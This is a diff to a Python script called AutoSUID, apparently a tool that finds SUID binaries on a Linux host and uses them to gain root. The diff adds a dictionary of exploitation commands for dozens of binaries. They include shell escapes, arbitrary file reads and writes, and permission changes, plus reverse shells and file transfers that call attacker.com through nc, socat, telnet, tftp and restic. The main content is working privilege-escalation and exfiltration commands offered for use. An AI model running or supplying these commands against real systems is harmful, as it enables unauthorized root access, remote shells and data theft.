@@ -1,6 +1,78 @@
-"""AutoSUID - automated priv-esc via Exploitable SUID - By Ben Roxbee Cox"""
+"""AutoSUID - automated priv-esc via SUID - By Ben Roxbee Cox"""
+from sys import argv
 from os import system, popen
 from time import sleep
+
+
+"""
+This dictionary contains all exploits known SUID vulnerable binaries. \
+This dictionary contains exploits which are not \
+automatically carried out by the program.
+"""
+customExploitation = {
+    'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
+    'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
+    'base32': 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode',
+    'base64': 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
+    'byebug': 'TF=$(mktemp)\necho \'system("/bin/sh")\' > $TF\n./byebug $TF\ncontinue',
+    'chmod': 'LFILE=file_to_change\n./chmod 0777 $LFILE',
+    'chown': 'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE',
+    'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
+    'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE',
+    'date': 'LFILE=file_to_read\n./date -f $LFILE',
+    'dd': 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
+    'dialog': 'LFILE=file_to_read\n./dialog --textbox "$LFILE" 0 0',
+    'diff': 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
+    'dmsetup': "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'", 'file': 'LFILE=file_to_read\n./file -m $LFILE',
+    'ed': './ed\n!/bin/sh',
+    'eqn': 'LFILE=file_to_read\n./eqn "$LFILE"',
+    'fmt': 'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"',
+    'git': 'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
+    'gtester': 'TF=$(mktemp)\necho \'#!/bin/sh -p\' > $TF\necho \'exec /bin/sh -p 0<&1\' >> $TF\nchmod +x $TF\ngtester -q $TF',
+    'hd': 'LFILE=file_to_read\n./hd "$LFILE"',
+    'hexdump': 'LFILE=file_to_read\n./hexdump -C "$LFILE"',
+    'highlight': 'LFILE=file_to_read\n./highlight --no-doc --failsafe "$LFILE"',
+    'iconv': 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"',
+    'iftop': './iftop\n!/bin/sh',
+    'ip': 'LFILE=file_to_read\n./ip -force -batch "$LFILE"',
+    'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
+    'jq': 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
+    'ksshell': 'LFILE=file_to_read\n./ksshell -i $LFILE',
+    'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"',
+    'look': 'LFILE=file_to_read\n./look \'\' "$LFILE"',
+    'lwp-download': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE',
+    'lwp-request': 'LFILE=file_to_read\n./lwp-request "file://$LFILE"',
+    'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
+    'mysql': "./mysql -e '\\! /bin/sh'", 'awk': './awk \'BEGIN {system("/bin/sh")}\'',
+    'nano': './nano\n^R^X\nreset; sh 1>&0 2>&0',
+    'nawk': './nawk \'BEGIN {system("/bin/sh")}\'',
+    'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT',
+    'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
+    'nohup': 'nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
+    'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
+    'pic': './pic -U\n.PS\nsh X sh X',
+    'pico': './pico\n^R^X\nreset; sh 1>&0 2>&0',
+    'pry': './pry\nsystem("/bin/sh")',
+    'readelf': 'LFILE=file_to_read\n./readelf -a @$LFILE',
+    'restic': 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
+    'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:',
+    'shuf': 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:',
+    'soelim': 'LFILE=file_to_read\n./soelim "$LFILE"',
+    'sqlite3': "./sqlite3 /dev/null '.shell /bin/sh'", 'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane',
+    'strings': 'LFILE=file_to_read\n./strings "$LFILE"',
+    'sysctl': 'LFILE=file_to_read\n./sysctl -n "/../../$LFILE"',
+    'systemctl': 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
+    'tac': 'LFILE=file_to_read\n./tac -s \'PromiseWontOverWrite\' "$LFILE"',
+    'tar': './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
+    'tee': 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
+    'telnet': 'RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh',
+    'tftp': 'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send',
+    'uudecode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
+    'uuencode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
+    'xz': 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d',
+    'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE',
+    'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
+}
 
 """Default SUID in Unix (Not exploitable)."""
 defaultSUIDBins = ["arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec",
@@ -208,15 +280,10 @@ def pwnSUIDs(vulnerableBins):
     return()
 
 
-def main():
+if __name__ == '__main__':
     try:
         allSUIDs = findSUIDBinaries()
         vulnBins = matchSUIDs(allSUIDs)
         pwnSUIDs(vulnBins[0])
     except KeyboardInterrupt:
         print(white + "Exiting")
-    return
-
-
-if __name__ == "__main__":
-    main()
